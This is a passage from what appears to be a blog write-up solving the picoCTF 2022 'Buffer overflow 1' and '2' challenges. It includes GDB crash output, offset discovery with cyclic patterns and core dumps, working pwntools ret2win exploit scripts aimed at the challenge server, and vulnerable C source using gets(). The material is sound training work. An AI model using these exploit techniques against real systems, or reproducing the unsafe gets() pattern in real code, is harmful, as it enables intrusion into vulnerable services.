+<p>Analyzing this breakpoint, if we look at the arrow on the assembly code, we can see that its address is the exact same as the <code>$eip</code> (<code>0x80492d7</code>). Let’s try overflowing this register by passing an unhealthy amount of <code>A</code>s into the program:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><pre><span style="color:#47D4B9"><b>gef➤  </b></span>r
+Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
+Please enter your string: 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Okay, time to return... Fingers Crossed... Jumping to 0x41414141
+
+Program received signal SIGSEGV, Segmentation fault.
+<span style="color:#367BF0">0x41414141</span> in <span style="color:#FEA44C">??</span> ()
+[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
+<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
+<span style="color:#EC0101"><b>$ebx   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
+<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
+<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
+<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  <span style="color:#FEA44C">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>
+<span style="color:#EC0101"><b>$ebp   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
+<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
+<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
+<span style="color:#EC0101"><b>$eip   </b></span>: 0x41414141 ("<span style="color:#FEA44C">AAAA</span>"?)
+<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
+<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x41414141
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
+[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: "vuln", <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x41414141</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span></pre></td></tr></table></div>
+
+<p>Look what happened: our program threw a SIGSEGV (segmentation) fault, as it is trying to reference the address <code>0x41414141</code>, which doesn’t exist! This is because our <code>$eip</code> was overwritten by all our <code>A</code>s (<code>0x41</code> in hex &#x3D; <code>A</code> in ASCII).</p>
+<h3 id="III-Finessing-the-Stack-🛠️"><a href="#III-Finessing-the-Stack-🛠️" class="headerlink" title="III: Finessing the Stack 🛠️"></a>III: Finessing the Stack 🛠️</h3><p>Although we’ve managed to smash the stack, we still don’t know the offset (<strong>how many</strong> <code>A</code>s we need to pass in order to reach the <code>$eip</code>). To solve this problem, we can use the pwntools <code>cyclic</code> command, which creates a string with a recognizable cycling pattern for it to identify:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>shell cyclic 48
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
+<span style="color:#47D4B9"><b>gef➤  </b></span>r
+Starting program: /home/kali/ctfs/pico22/buffer-overflow-1/vuln 
+Please enter your string: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaa
+Okay, time to return... Fingers Crossed... Jumping to 0x6161616c
+
+Program received signal SIGSEGV, Segmentation fault.
+<span style="color:#367BF0">0x6161616c</span> in <span style="color:#FEA44C">??</span> ()
+[ Legend: <span style="color:#EC0101"><b>Modified register</b></span> | <span style="color:#D41919">Code</span> | <span style="color:#5EBDAB">Heap</span> | <span style="color:#9755B3">Stack</span> | <span style="color:#FEA44C">String</span> ]
+<span style="color:#585858"><b>──────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">registers</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>$eax   </b></span>: 0x41      
+<span style="color:#EC0101"><b>$ebx   </b></span>: 0x6161616a (&quot;<span style="color:#FEA44C">jaaa</span>&quot;?)
+<span style="color:#EC0101"><b>$ecx   </b></span>: 0x41      
+<span style="color:#EC0101"><b>$edx   </b></span>: 0xffffffff
+<span style="color:#EC0101"><b>$esp   </b></span>: <span style="color:#9755B3">0xffffd130</span>  →  0x00000000
+<span style="color:#EC0101"><b>$ebp   </b></span>: 0x6161616b (&quot;<span style="color:#FEA44C">kaaa</span>&quot;?)
+<span style="color:#EC0101"><b>$esi   </b></span>: 0x1       
+<span style="color:#EC0101"><b>$edi   </b></span>: <span style="color:#D41919">0x80490e0</span>  →  <span style="color:#585858"><b>&lt;_start+0&gt; endbr32 </b></span>
+<span style="color:#EC0101"><b>$eip   </b></span>: 0x6161616c (&quot;<span style="color:#FEA44C">laaa</span>&quot;?)
+<span style="color:#367BF0">$cs</span>: 0x23 <span style="color:#367BF0">$ss</span>: 0x2b <span style="color:#367BF0">$ds</span>: 0x2b <span style="color:#367BF0">$es</span>: 0x2b <span style="color:#367BF0">$fs</span>: 0x00 <span style="color:#EC0101"><b>$gs</b></span>: 0x63 
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">code:x86:32</span><span style="color:#585858"><b> ────</b></span>
+<span style="color:#EC0101"><b>[!]</b></span> Cannot disassemble from $PC
+<span style="color:#EC0101"><b>[!]</b></span> Cannot access memory at address 0x6161616c
+<span style="color:#585858"><b>────────────────────────────────────────────────────────────────────── </b></span><span style="color:#49AEE6">threads</span><span style="color:#585858"><b> ────</b></span>
+[<span style="color:#47D4B9"><b>#0</b></span>] Id 1, Name: &quot;vuln&quot;, <span style="color:#EC0101"><b>stopped</b></span> <span style="color:#367BF0">0x6161616c</span> in <span style="color:#FF8A18"><b>??</b></span> (), reason: <span style="color:#962AC3"><b>SIGSEGV</b></span></pre></td></tr></table></div>
+
+<p>We can see that <code>$eip</code> is currently overflowed with the pattern <code>0x6161616c</code> (<code>laaa</code>). let’s search for this pattern using <code>pattern search</code>:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>GEF pattern command</span><a target="_blank" rel="noopener" href="https://gef.readthedocs.io/en/master/commands/pattern/"><span>[documentation]</span></a></figcaption><tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>pattern search 0x6161616c
+<span style="color:#277FFF"><b>[+]</b></span> Searching for &apos;0x6161616c&apos;
+<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 44 (little-endian search) <span style="color:#EC0101"><b>likely</b></span>
+<span style="color:#47D4B9"><b>[+]</b></span> Found at offset 41 (big-endian search) </pre></td></tr></table></div>
+
+<p>To figure out which offset we need to use, we can use <code>readelf</code> to analyze header of the <code>vuln</code> executable:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>readelf command</span><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man1/readelf.1.html"><span>[documentation]</span></a></figcaption><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">readelf -h vuln | grep endian</span></span><br><span class="line">  Data: 2&#x27;s complement, little endian</span></pre></td></tr></table></div>
+
+<p>Our binary is in little endian, we know that 44 <code>A</code>s are needed in order to reach the <code>$eip</code>. The only thing we need now before we create our exploit is the address of the <code>win()</code> function, which will be appended to the end of our buffer to overwrite the <code>$eip</code> on the stack:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>GDB x command</span><a target="_blank" rel="noopener" href="https://visualgdb.com/gdbreference/commands/x"><span>[documentation]</span></a></figcaption><tr><td class="code"><pre><span style="color:#47D4B9"><b>gef➤  </b></span>x win
+<span style="color:#367BF0">0x80491f6</span> &lt;<span style="color:#FEA44C">win</span>&gt;:	0xfb1e0ff3</pre></td></tr></table></div>
+
+<p>Win is at <code>0x80491f6</code>, but we need to convert it to the little endian format. You can do this with the pwntools <code>p32()</code> command, which results in <code>\xf6\x91\x04\x08</code>.<br>Let’s make a final visual of our payload:</p>
+<p><img src="/static/picoctf-2022/buffer-overflow/payload-visual.png" alt="Payload Visual"></p>
+<p>Let’s write our payload and send it to the remote server with Python3&#x2F;pwntools:</p>
+<div><figure class="highlight py" style=""><table><figcaption><span>buffer-overflow-1.py</span><a target="_blank" rel="noopener" href="https://gist.github.com/jktrn/23ec53b007e3589c6793acffce207394"><span>[github gist link]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="comment">#!/usr/bin/env python3</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+
+payload = <span class="string">b&quot;A&quot;</span>*<span class="number">44</span> + p32(<span class="number">0x80491f6</span>)  <span class="comment"># Little endian: b&#x27;\xf6\x91\x04\x08&#x27;</span>
+host, port = <span class="string">&quot;saturn.picoctf.net&quot;</span>, [PORT]
+
+p = remote(host, port)      <span class="comment"># Opens the connection</span>
+log.info(p.recvS())         <span class="comment"># Decodes/prints &quot;Please enter your string:&quot;</span>
+p.sendline(payload)         <span class="comment"># Sends the payload</span>
+log.success(p.recvallS())   <span class="comment"># Decodes/prints all program outputs</span>
+p.close()                   <span class="comment"># Closes the connection</span></pre></td></tr></table></div>
+
+<p>Let’s try running the script on the server:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="meta prompt_">$ </span>python3 buffer-overflow-1.py
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Please enter your string: 
+[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (100B)
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port <span style="color:#696969"><b>[PORT]</b></span>
+[<span style="color:#47D4B9"><b>+</b></span>] Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+    picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}</pre></td></tr></table></div>
+
+<p>We have completed our first <code>ret2win</code> buffer overflow on a x32 binary! Yet, this is just the beginning. How about we spice things up a little bit?</p>
+<h3 id="IV-Automating-the-Stack-🔧"><a href="#IV-Automating-the-Stack-🔧" class="headerlink" title="IV: Automating the Stack 🔧"></a>IV: Automating the Stack 🔧</h3><p>Although the concept of buffer overflows can seem daunting to newcomers, experienced pwners will often find these sorts of challenges trivial, and don’t want to spend the effort manually finding offsets and addresses just to send the same type of payload. This is where our best friend comes in: <strong>pwntools</strong> helper functions and automation! Let’s start with the first part - the <code>$eip</code> offset for x32 binaries.</p>
+<p>The main helper we will be using is <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/elf/corefile"><code>pwnlib.elf.corefile</code></a>. It can parse <a target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/aix/7.1?topic=formats-core-file-format">core dump</a> files, which are generated by Linux whenever errors occur during a running process. These files take an <strong>image</strong> of the process when the error occurs, which may assist the user in the debugging process. Remember when we sent a large <code>cyclic</code> pattern which was used to cause a segmentation fault? We’ll be using the core dump to view the state of the registers during that period, without needing to step through it using GDB. We’ll be using the coredump to eventually find the offset!</p>
+<div class="text-info no-highlight"><i class="fa-solid fa-circle-info"></i> Info: Many Linux systems do not have core dumps properly configured. For bash, run <code>ulimit -c unlimited</code> to generate core dumps of unlimited size. For tsch, run <code>limit coredumpsize unlimited</code>. By default, cores are dumped into either the current directory or <code>/var/lib/systemd/coredump</code>.</div>
+
+<p>Before we start, let’s work through the steps with command-line Python. First, let’s import the pwntools global namespace and generate an <code>elf</code> object using pwntool’s <code>ELF()</code>:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span>python3 -q</span><br><span class="meta prompt_">>>></span> from pwn import *
+<span class="meta prompt_">>>></span> elf = context.binary = ELF('./vuln')
+[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#D41919">NX disabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
+    RWX:      <span style="color:#D41919">Has RWX segments</span></pre></td></tr></table></div>
+
+<p>We can then generate a <code>cyclic()</code> payload and start a local process referencing the aforementioned <code>elf</code> object. Sending the payload and using the <a target="_blank" rel="noopener" href="https://www.educba.com/python-wait/"><code>.wait()</code></a> method will throw an exit code -11, which signals a segmentation fault and generates a core dump. </p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">>>></span> p = process(elf.path)
+[<span style="color:#9755B3">x</span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln'
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2219
+<span class="meta prompt_">>>></span> p.sendline(cyclic(128))
+<span class="meta prompt_">>>></span> p.wait()
+[<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2219)
+<span class="meta prompt_">>>></span> exit()
+<span class="meta prompt_">$ </span>ls -al
+total 2304
+drwxr-xr-x  3 kali kali    4096 Jun 16 15:35 <span style="color:#277FFF"><b>.</b></span>
+drwxr-xr-x 16 kali kali    4096 Jun 14 17:13 <span style="color:#277FFF"><b>..</b></span>
+-rw-------  1 kali kali 2588672 Jun 16 15:35 core
+-rw-r--r--  1 kali kali     358 Jun 16 03:22 buffer-overflow-1.py
+-rwxr-xr-x  1 kali kali   15704 Mar 15 02:45 <span style="color:#47D4B9"><b>vuln</b></span>
+-rw-r--r--  1 kali kali     769 Mar 15 02:45 vuln.c</pre></td></tr></table></div>
+
+<p>We can now create a corefile object and freely reference registers! To find the offset, we can simply call the object key within <code>cyclic_find()</code>.</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">>>></span> core = Corefile('./core')
+[<span style="color:#9755B3">x</span>] Parsing corefile...
+[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
+    Arch:      i386-32-little
+    EIP:       0x6161616c
+    ESP:       0xff93abe0
+    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' (0x8048000)
+    Fault:     0x6161616c
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+<span class="meta prompt_">>>></span> core.registers
+{'eax': 65, 'ebp': 1633771883, 'ebx': 1633771882, 'ecx': 65, 'edi': 134516960, 'edx': 4294967295, 'eflags': 66178, 'eip': 1633771884, 'esi': 1, 'esp': 4287867872, 'orig_eax': 4294967295, 'xcs': 35, 'xds': 43, 'xes': 43, 'xfs': 0, 'xgs': 99, 'xss': 43}
+<span class="meta prompt_">>>></span> hex(core.eip)
+'0x6161616c'</pre></td></tr></table></div>
+
+<p>Now that we know how ELF objects and core dumps work, let’s apply them to our previous script. Another cool helper I would like to implement is <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/util/packing.html"><code>flat()</code></a> (which has a great tutorial <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=AMDbbuLaXfk">here</a>, referred to by the legacy alias <code>fit()</code>), which flattens arguments given in lists, tuples, or dictionaries into a string with <code>pack()</code>. This will help us assemble our payload without needing to concatenate seemingly random strings of <code>A</code>s and little-endian addresses, increasing readability.</p>
+<p>This is my final, completely automated script:</p>
+<div><figure class="highlight py" style=""><table><figcaption><span>buffer-overflow-1-automated.py</span><a target="_blank" rel="noopener" href="https://gist.github.com/jktrn/b1586f403c6ae31ce0e128b8f96faad6"><span>[github gist link]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="comment">#!/usr/bin/env python3</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+
+elf = context.binary = ELF(<span class="string">&#x27;./vuln&#x27;</span>, checksec=<span class="literal">False</span>)    <span class="comment"># sets elf object</span>
+host, port = <span class="string">&#x27;saturn.picoctf.net&#x27;</span>, [PORT]
+
+p = process(elf.path)        <span class="comment"># references elf object</span>
+p.sendline(cyclic(<span class="number">128</span>))      <span class="comment"># sends cyclic pattern to crash</span>
+p.wait()                     <span class="comment"># sigsegv generates core dump</span>
+core = Coredump(<span class="string">&#x27;./core&#x27;</span>)    <span class="comment"># parse core dump file</span>
+
+payload = flat({
+    cyclic_find(core.eip): elf.symbols.win    <span class="comment"># offset:address</span>
+})
+
+<span class="keyword">if</span> args.REMOTE:    <span class="comment"># remote process if arg</span>
+    p = remote(host, port)
+<span class="keyword">else</span>:
+    p = process(elf.path)
+
+p.sendline(payload)
+p.interactive()    <span class="comment"># receives flag</span></pre></td></tr></table></div>
+
+<p>Let’s run the script on the server:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 buffer-overflow-1-automated.py REMOTE
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln': pid 2601
+[<span style="color:#277FFF"><b>*</b></span>] Process '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' stopped with exit code -11 (SIGSEGV) (pid 2601)
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+[<span style="color:#277FFF"><b>*</b></span>] '/home/kali/ctfs/pico22/buffer-overflow-1/core'
+    Arch:      i386-32-little
+    EIP:       0x6161616c
+    ESP:       0xff829260
+    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-1/vuln' (0x8048000)
+    Fault:     0x6161616c
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
+Please enter your string: 
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{addr3ss3s_ar3_3asy_<span style="color:#696969"><b>[REDACTED]</b></span>}[<span style="color:#277FFF"><b>*</b></span>] Got EOF while reading in interactive</pre></td></tr></table></div>
+
+<p>We’ve successfully automated a solve on a simple x32 buffer overflow!</p>
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="Buffer-overflow-2" class="chal-title"><a href="#Buffer-overflow-2" class="headerlink" title="Buffer overflow 2"></a>Buffer overflow 2</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>authors</b>: <br> - Sanjay C.<br> - Palash Oswal<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: pwn/binary<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 300<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/picoctf-2022/buffer-overflow/vuln-2">vuln</a>, <a href="/static/picoctf-2022/buffer-overflow/vuln-2.c">vuln.c</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" style="font-size: 105%">
+                Control the return address and arguments.<br />
+This time you'll need to control the arguments to the function you return to! Can you get the flag from this <a href="/static/picoctf-2022/buffer-overflow/vuln-2">program</a>?<br />
+You can view source <a href="/static/picoctf-2022/buffer-overflow/vuln-2.c">here</a>. And connect with it using:<br />
+<code>nc saturn.picoctf.net [PORT]</code>
+                <br><details><summary><b>Hints</b>:</summary><br><ol>
+<li>Try using GDB to print out the stack once you write to it.</li>
+</ol><br></details>
+            </div>
+        </div>
+    </div>
+    </div>
+
+<div class="text-warning no-highlight"><i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <strong>instance-based</strong> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.</div>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>checksec.sh</span><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh"><span>[github link]</span></a></figcaption><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#5EBDAB">NX enabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span></pre></td></tr></table></div>
+
+<p>Let’s check out our source code:</p>
+<div><figure class="highlight c" style="height: 400px; overflow: scroll; margin: 1rem 0;"><table><figcaption><span>vuln-2.c</span><a href="https://enscribe.dev/static/picoctf-2022/buffer-overflow/vuln-2.c"><span>[download source]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span>
+
+<span class="meta">#<span class="keyword">define</span> BUFSIZE 100</span>
+<span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span>
+
+<span class="type">void</span> <span class="title function_">win</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> arg1, <span class="type">unsigned</span> <span class="type">int</span> arg2)</span> {
+  <span class="type">char</span> buf[FLAGSIZE];
+  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);
+  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) {
+    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,
+                    <span class="string">&quot;own debugging flag.\n&quot;</span>);
+    <span class="built_in">exit</span>(<span class="number">0</span>);
+  }
+
+  fgets(buf,FLAGSIZE,f);
+  <span class="keyword">if</span> (arg1 != <span class="number">0xCAFEF00D</span>)
+    <span class="keyword">return</span>;
+  <span class="keyword">if</span> (arg2 != <span class="number">0xF00DF00D</span>)
+    <span class="keyword">return</span>;
+  <span class="built_in">printf</span>(buf);
+}
+
+<span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>{
+  <span class="type">char</span> buf[BUFSIZE];
+  gets(buf);
+  <span class="built_in">puts</span>(buf);
+}
+
+<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{
+
+  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);
+  
+  <span class="type">gid_t</span> gid = getegid();
+  setresgid(gid, gid, gid);
+
+  <span class="built_in">puts</span>(<span class="string">&quot;Please enter your string: &quot;</span>);
+  vuln();
+  <span class="keyword">return</span> <span class="number">0</span>;
+}</pre></td></tr></table></div>
+
+<p>Looking at the <code>win()</code> function, we can see that two arguments are required that need to be passed into the function to receive the flag. Two guard clauses lay above the flag print:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">fgets(buf,FLAGSIZE,f);</span><br><span class="line"><span class="keyword">if</span> (arg1 != <span class="number">0xCAFEF00D</span>)</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (arg2 != <span class="number">0xF00DF00D</span>)</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
+
+<p>The goal is simple: call <code>win(0xCAFEF00D, 0xF00DF00D)</code>! We’ll be doing it the hard way (for a learning experience), in addition to a more advanced easy way. Let’s get started.</p>
+<h3 id="I-The-Hard-Way-🐢"><a href="#I-The-Hard-Way-🐢" class="headerlink" title="I: The Hard Way 🐢"></a>I: The Hard Way 🐢</h3><p>We can apply a lot from what we learned in <code>Buffer overflow 1</code>. The first thing we should do is find the offset, which requires no hassle with pwntools helpers! Although we’ll get actual number here, I won’t include it in the final script for the sake of not leaving out any steps. Simply segfault the process with a cyclic string, read the core dump’s fault address (<code>$eip</code>) and throw it into <code>cyclic_find()</code>:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 -q
+<span class="meta prompt_">>>> </span>from pwn import *
+<span class="meta prompt_">>>> </span>elf = context.binary = ELF(&apos;./vuln&apos;)
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#5EBDAB">NX enabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span>
+<span class="meta prompt_">>>> </span>p = process(elf.path)
+[<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 2777
+<span class="meta prompt_">>>> </span>p.sendline(cyclic(128))
+<span class="meta prompt_">>>> </span>p.wait()
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 2777)
+<span class="meta prompt_">>>> </span>core = Corefile(&apos;./core&apos;)
+[<span style="color:#9755B3">x</span>] Parsing corefile...
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xffafca40
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
+    Fault:     0x62616164
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+<span class="meta prompt_">>>> </span>cyclic_find(0x62616164)
+112</pre></td></tr></table></div>
+
